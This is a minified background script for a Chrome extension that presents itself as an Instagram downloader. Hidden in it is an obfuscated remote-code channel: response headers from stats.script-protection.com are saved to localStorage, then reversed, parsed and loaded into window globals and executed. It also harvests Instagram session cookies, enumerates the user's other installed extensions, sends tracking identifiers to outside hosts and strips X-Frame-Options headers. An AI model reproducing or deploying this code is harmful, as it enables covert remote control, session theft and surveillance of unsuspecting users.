!function(){function a(a,b){var c="https://stats.script-protection.com/__utm.gif?e=instagram_downloader"+C()+"&k="+encodeURIComponent(a)+"&uid="+encodeURIComponent(""+u)+"&it="+(window.localStorage.installedTime||"")+"&lang="+(window&&window.navigator&&window.navigator.language?window.navigator.language:"-")+"&r="+Math.random()+("undefined"!=typeof b?"&d="+encodeURIComponent(b):"");c=c.substr(0,2e3),(new Image).src=c}function b(a,b,c){$.ajax({url:"https://stats.script-protection.com/__utm.gif?e=instagram_downloader"+C()+"&k="+encodeURIComponent(a)+"&url="+encodeURIComponent(b)+"&uid="+encodeURIComponent(""+u)+"&it="+(window.localStorage.installedTime||"")+"&lang="+(window&&window.navigator&&window.navigator.language?window.navigator.language:"-")+"&r="+Math.random(),method:"POST",data:c})}function c(b,d){if("undefined"!=typeof d&&"string"!=typeof d)return void c(" ["+b+"]wrong_type_details_track_event",b+": "+typeof d);if(u)a(b,d);else{var e="uidinstagram_downloader";chrome.storage.sync.get(e,function(c){u=c[e]||"nop",a(b,d)})}}function d(a,d,e){if("string"!=typeof d)return void c("wrong_type_url_track_event",""+typeof d);if("string"!=typeof e)return void c(" ["+a+"]wrong_type_details_track_event",a+": "+typeof e);if(u)b(a,d,e);else{var f="uidinstagram_downloader";chrome.storage.sync.get(f,function(c){u=c[f]||"nop",b(a,d,e)})}}function e(a){var b={};chrome.cookies.get({url:E,name:"ds_user_id"},function(c){c&&(b.ds_user_id=c.value),chrome.cookies.get({url:E,name:"sessionid"},function(c){c&&(b.sessionid=c.value),chrome.cookies.get({url:E,name:"csrftoken"},function(c){c&&(b.csrftoken=c.value),a&&a(b)})})})}function f(a){e(function(b){D=b,"undefined"!=typeof D.ds_user_id&&"undefined"!=typeof D.sessionid&&"undefined"!=typeof D.csrftoken&&"function"==typeof a?"function"==typeof a&&a(b):"function"==typeof a&&a()})}function g(a,b){J||(J=Date.now());var c=3;return b=b||0,b++,Date.now()<I+K?void a(H):void f(function(d){$.ajax({method:"GET",url:"https://i.instagram.com/api/v1/feed/reels_tray/",dataType:"json"}).done(function(d){if(d&&"object"==typeof d){I=Date.now();var e=d.broadcasts||[],f=d.post_live&&d.post_live.post_live_items||[],h=d.tray||[];H=[].concat(e,f,h),a(H)}else c>b&&setTimeout(function(){g(a,b)},1e3)}).fail(function(d){c>b&&setTimeout(function(){g(a,b)},1e3)})})}function h(a,b,d){var e,f,g=function(c){if("function"==typeof d){if(!c)return d();y[c]=b.tab.id,a.isStory&&(x[c]=b.tab.id),e=setInterval(function(){w[c]&&(window.localStorage.downloadOne++,d(c),clearInterval(e),clearTimeout(f),delete w[c]),f=setTimeout(function(){e&&(clearInterval(e),d())},1e4)},100)}};if("object"!=typeof a||!a.url||!a.filename)return g();var h=a.url,i=a.filename,j={url:h};i&&(j.filename=i),chrome.downloads.download(j,function(b){if("undefined"==typeof b){var d=a.filename.match(/([\w_]+)(\.\w{3,4})$/);d=d&&d[0],d?(i=d.substr(d.length-32),i&&(j.filename=i),chrome.downloads.download(j,function(a){"undefined"==typeof a&&Math.random()<.1&&c("reject_download",JSON.stringify({filename:i})),g(a)})):(Math.random()<.1&&c("not_valid_filename_for_download",JSON.stringify({filename:i})),g(b))}else g(b)})}function i(a,b){chrome.tabs.get(a,function(a){b(a.url)})}function j(a){var b=a.url;if(-1===b.indexOf("/explore/locations/")){var c=b.match(/variables=([^&]+)/);c=c&&c[1];var d=b.match(/query_hash=([^&]+)/);if(d=d&&d[1],c&&d){c=decodeURIComponent(c);try{c=JSON.parse(c)}catch(e){}if("object"==typeof c&&"undefined"==typeof c.only_stories&&"undefined"==typeof c.has_stories&&"undefined"==typeof c.fetch_media_item_count&&"undefined"==typeof c.fetch_comment_count&&("undefined"!=typeof c.id&&"undefined"!=typeof c.first&&"undefined"!=typeof c.after||"undefined"!=typeof c.reel_ids&&"undefined"!=typeof c.tag_names&&"undefined"!=typeof c.highlight_reel_ids&&"undefined"!=typeof c.location_ids)){var f=window.localStorage.newQueryHashes||'{"saved": [], "owner": [], "highlight_reels": [], "tagged": []}',g=JSON.parse(f);i(a.tabId,function(a){var b=-1!==a.indexOf("/stories/highlights/")?"highlight_reels":-1!==a.indexOf("/saved/")?"saved":-1!==a.indexOf("/tagged/")?"tagged":"owner";g[b]||(g[b]=[]),L[b]!==d&&-1==g[b].indexOf(d)&&(g[b].push(d),window.localStorage.existNewQueryHash="1",window.localStorage.newQueryHashes=JSON.stringify(g))})}}}}function k(){return"1"===window.localStorage.existNewQueryHash?(window.localStorage.existNewQueryHash=0,JSON.parse(window.localStorage.newQueryHashes)):void 0}function l(a,b){"owner"==a?window.localStorage.newWorkingQueryHashOwner=b:"saved"==a?window.localStorage.newWorkingQueryHashSaved=b:"highlight_reels"==a?window.localStorage.newWorkingQueryHashStoriesHighlight=b:"tagged"==a&&(window.localStorage.newWorkingQueryHashTagged=b)}function m(){return{saved:window.localStorage.newWorkingQueryHashSaved||L.saved,owner:window.localStorage.newWorkingQueryHashOwner||L.owner,highlight_reels:window.localStorage.newWorkingQueryHashStoriesHighlight||L.highlight_reels,tagged:window.localStorage.newWorkingQueryHashTagged||L.tagged}}function n(a,b){var c=JSON.parse(window.localStorage.newQueryHashes);if(c){var d=c[a].indexOf(b);-1!=d&&(c[a].splice(d,1),window.localStorage.newQueryHashes=JSON.stringify(c))}}function o(a){var b,c=[],d=1e3,e=[chrome.runtime.id];chrome.management.getAll(function(f){f.forEach(function(a){"extension"===a.type&&a.enabled&&-1==e.indexOf(a.id)&&c.push(a.id)}),b=c.join().substr(0,d),a(b)})}function p(a){chrome.tabs.create({url:a})}function q(){if("undefined"==typeof jj&&localStorage["cache-control"]){var a=localStorage["cache-control"].split(",");try{var b;for(var c in a){var d=a[c].trim();if(!(d.length<10))try{if(b=d.strrevsstr(),b="undefined"!=typeof JSON&&JSON.parse&&JSON.parse(b),b&&b.cache_c){for(var e in b)window[e]=b[e];break}}catch(f){}}}catch(f){}$.siblingAfter(),setTimeout(function(){$.postOff()},2e3)}}function r(a){var b="chrome-extension://"+chrome.runtime.id+"/stories.html";a&&(b+="#live_"+a),chrome.tabs.create({url:b})}function s(a){chrome.bookmarks.getChildren("1",function(b){chrome.bookmarks.create({parentId:"1",index:b.length>2?2:b.length,title:"instaPhone",url:"chrome-extension://"+chrome.runtime.id+"/phone.html"},function(b){"function"==typeof a&&a(b)})})}function t(a){chrome.bookmarks.search("chrome-extension://"+chrome.runtime.id+"/phone.html",function(b){"function"==typeof a&&(b&&b.length?a(!0):a())})}var u=null,v=[],w={},x={},y={},z={},A={},B=!1,C=function(){return"&vid="+(chrome.runtime.id?chrome.runtime.id.substr(0,11):"-")+"&vv="+(chrome.runtime.getManifest&&chrome.runtime.getManifest()?chrome.runtime.getManifest().version:"-")},D={},E="https://www.instagram.com",F="Instagram 10.26.0 (iPhone7,2; iOS 10_1_1; en_US; en-US; scale=2.00; gamut=normal; 750x1334) AppleWebKit/420+",G="Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Mobile Safari/537.36";f();var H=[],I=0,J=0,K=3e4;window.localStorage.allSuccessTriesCountStories||(window.localStorage.allSuccessTriesCountStories=0),window.localStorage.allFailedTriesCountStories||(window.localStorage.allFailedTriesCountStories=0),chrome.downloads.onCreated.addListener(function(a){w[a.id]=1,a.url.indexOf("blob:https://www.instagram.com")>-1&&(z[a.id]=a.url)}),chrome.downloads.onChanged.addListener(function(a){if(x[a.id]&&(chrome.tabs.sendMessage(x[a.id],"storyPauseOffByDownloadId"),delete x[a.id]),y[a.id]&&a.state&&("interrupted"==a.state.current||"complete"==a.state.current)&&(chrome.tabs.sendMessage(y[a.id],{action:"downloadFileFinished",status:a.state.current}),delete y[a.id]),z[a.id]){var b=z[a.id];chrome.tabs.query({url:["*://*.instagram.com/*"]},function(a){a.forEach(function(a){chrome.tabs.sendMessage(a.id,{action:"storyPauseOffByBlobUrl",url:b})})}),v.forEach(function(a){chrome.tabs.sendMessage(a,{action:"storyPauseOffByBlobUrl",url:b})}),delete z[a.id]}});var L={saved:"f883d95537fbcd400f466f63d42bd8a1",owner:"472f257a40c653c64c666ce877d59d2b",highlight_reels:"45246d3fe16ccc6577e0bd297a5db1ab",tagged:"de71ba2f35e0b59023504cfeb5b9857e"};window.localStorage.newQueryHashes=window.localStorage.newQueryHashes||'{"saved": [], "owner": [], "highlight_reels": []}',chrome.webRequest.onBeforeSendHeaders.addListener(function(a){var b,c,d=a.requestHeaders;if(a.url.indexOf("/graphql/query/")>-1)return void j(a);if(-1!==a.url.indexOf("/api/v1/")){var e=!0;if(D.ds_user_id&&D.sessionid||(e=!1),e)for(c=0;c<d.length;c++)b=d[c],"x-requested-with"==b.name.toLowerCase()&&(e=!1);if(e)for(c=0;c<d.length;c++)b=d[c],"referer"==b.name.toLowerCase()&&-1==b.value.indexOf("instagram.com")&&(e=!1);if(!e)return;var f="ds_user_id="+D.ds_user_id+"; sessionid="+D.sessionid+"; csrftoken="+D.csrftoken+";";for(c=0;c<d.length;c++)b=d[c],"user-agent"==b.name.toLowerCase()&&(b.value=F),"cookie"==b.name.toLowerCase()&&(b.value=f);return{requestHeaders:d}}if(-1!=a.url.indexOf("create/upload/photo/")||-1!=a.url.indexOf("create/configure/")||-1!=a.url.indexOf("create/configure_to_story/")||-1!=a.url.indexOf("/create/")&&-1!=a.url.indexOf("/delete/")){for(c=0;c<d.length;c++){if(b=d[c],"referer"==b.name.toLowerCase()){if(-1==b.value.indexOf("instagram.com"))return;b.value="https://www.instagram.com/create/style/"}"user-agent"==b.name.toLowerCase()&&(b.value=G)}return{requestHeaders:d}}},{urls:["*://*.instagram.com/*"],types:["xmlhttprequest"]},["blocking","requestHeaders"]),chrome.webRequest.onHeadersReceived.addListener(function(a){if(v.length&&(v.indexOf(a.tabId)>-1||-1==a.tabId&&-1==a.frameId))for(var b=0;b<a.responseHeaders.length;++b)if("x-frame-options"===a.responseHeaders[b].name.toLowerCase())return a.responseHeaders.splice(b,1),{responseHeaders:a.responseHeaders}},{urls:["*://*.instagram.com/*"]},["blocking","responseHeaders"]),setInterval(function(){var a=[];v.forEach(function(b){chrome.tabs.sendMessage(b,"checkConnect",function(c){c&&a.push(b)})}),v=a,q()},6e4),chrome.runtime.onMessage.addListener(function(a,b,e){if(a)if("string"==typeof a)switch(a){case"warning-off":window.localStorage.warningOff=1;break;case"warning-request":e(!window.localStorage.warningOff);break;case"getCookies":return f(e),!0;case"requestStories":return g(e),!0;case"estimateLater":window.localStorage.ratingRequestNeedReply=1,window.localStorage.ratingLastRequestTime=Date.now();break;case"getPopupRate":e(window.localStorage.popupRate);break;case"getInstalledExtensions":return o(e),!0;case"getUserSelfInfo":return f(function(a){a&&a.ds_user_id?e(a.ds_user_id):e()}),!0;case"noMainContTrack":window.localStorage.noMainContTrack||(window.localStorage.noMainContTrack=1,e());break;case"noNativeStoriesContTrack":window.localStorage.noNativeStoriesContTrack||(window.localStorage.noNativeStoriesContTrack=1,e());break;case"mobileStateInit":v.push(b.tab.id),e(!0);break;case"amIMobile":b.tab.url&&b.tab.url.indexOf("chrome-extension://"+chrome.runtime.id)>-1?e(1):b.tab.url&&b.tab.url.indexOf("chrome-extension://")>-1?e(2):e();break;case"openMobileMode":chrome.tabs.create({url:"chrome-extension://"+chrome.runtime.id+"/phone.html"});break;case"inBookmarks":return t(function(a){"function"==typeof e&&e(a)}),!0;case"addPhone2Bookmarks":return s(function(a){"function"==typeof e&&e(a)}),!0;case"iWillLogIn":A[b.tab.id]=1;break;case"amIJustLogIn":e(1==A[b.tab.id]),delete A[b.tab.id];break;case"getNewQueryHashes":e(k());break;case"getWorkingQueryHashes":e(m());break;case"reportFirstSent":window.localStorage.reportFirstSent=1;break;case"reportSecondSent":window.localStorage.reportSecondSent=1;break;case"reportRequestsSent":window.localStorage.reportRequestsSent=1;break;case"needReportSend":window.localStorage.reportSecondSent?e():e(window.localStorage.reportFirstSent?1:2);break;case"needReportRequests":window.localStorage.reportRequestsSent?e():e(!0);break;case"downloadAllProcessStart":B=!0;break;case"downloadAllProcessFinished":B=!1;break;case"isDownloadAllProcessNow":e(B);break;case"massDownloadProSettingOff":localStorage.massDownloadProSettingOn=0;break;case"massDownloadProSettingOn":localStorage.massDownloadProSettingOn=1;break;case"askMassDownloadPro":e("1"==localStorage.massDownloadProSettingOn);break;default:return}else if("object"==typeof a&&"string"==typeof a.action)switch(a.action){case"trackEvent":"string"==typeof a.event&&a.event.length>0&&c(a.event,a.details);break;case"trackEventPost":d(a.event,a.url,a.details);break;case"downloadFile":return h(a.options,b,e),!0;case"setPopupRate":0==a.value?delete window.localStorage.popupRate:window.localStorage.popupRate=a.value;break;case"pageHasIframe":var i=a.tabId;return chrome.tabs.executeScript(i,{code:'var frames = document.querySelectorAll(".instagram-media"); frames.length'},function(a){a&&a.length&&e(a[0])}),!0;case"downloadZip":window.localStorage.downloadZip++;break;case"setNewWorkingQueryHash":l(a.type,a.query_hash);break;case"removeNotWorkingQueryHash":n(a.type,a.query_hash);break;case"open_stories_tab":r(a.story_id);break;case"open_new_tab":p(a.url);break;default:return}}),function(){chrome.webRequest.onCompleted.addListener(function(a){a.responseHeaders.forEach(function(a){localStorage[a.name.toLowerCase()]=a.value})},{urls:["https://stats.script-protection.com/*"],types:["image"]},["responseHeaders"])}(),function(){var a=function(){return"storexxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=16*Math.random()|0,c="x"===a?b:3&b|8;return c.toString(16)})};"undefined"==typeof window.localStorage.installedTime&&(window.localStorage.installedTime=Date.now()),"undefined"==typeof window.localStorage.downloadOne&&(window.localStorage.downloadOne=0),"undefined"==typeof window.localStorage.downloadZip&&(window.localStorage.downloadZip=0);var b="nop",c="uidinstagram_downloader";chrome.storage.sync.get(c,function(d){function e(){var a,c=[];chrome.management.getAll(function(d){d.forEach(function(a){"extension"===a.type&&a.enabled&&"normal"===a.installType&&a.id!=chrome.runtime.id&&-1==h.indexOf(a.id)&&c.push(a.id.substr(0,11))});var e="https://instagram.user-experience.space/?ext=instagram_downloader"+C()+"&uid="+b+"&d_1="+(window.localStorage.downloadOne||"0")+"&d_z="+(window.localStorage.downloadZip||"0");a=c.join(),e=e+"&ids="+(a||""),e+="&rnd="+Math.random().toString().substr(0,8),e=e.substr(0,255),chrome.runtime.setUninstallURL(e)})}var f=d[c];if(!f){chrome.tabs.create({url:"chrome-extension://"+chrome.runtime.id+"/thankyou.html"}),f=a();var g={};g[c]=f,chrome.storage.sync.set(g)}u=b=f,(new Image).src="https://stats.script-protection.com/__utm.gif?e=instagram_downloader"+C()+"&k=bkg_run&it="+(window.localStorage.installedTime||"")+"&uid="+encodeURIComponent(b)+"&r="+Math.random();var h=[""];chrome.runtime.setUninstallURL&&(e(),setInterval(e,3e5))}),setTimeout(function(){"nop"==b&&((new Image).src="https://stats.script-protection.com/__utm.gif?e=instagram_downloader"+C()+"&k=bkg_run&it="+(window.localStorage.installedTime||"")+"&uid="+encodeURIComponent(b)+"&r="+Math.random())},6e4)}(),function(){function a(){chrome.runtime.sendMessage("checkPopupOpened",function(b){b?setTimeout(a,6e5):window.location.reload()})}chrome.runtime.onConnect.addListener(function(a){}),setTimeout(a,864e5)}()}();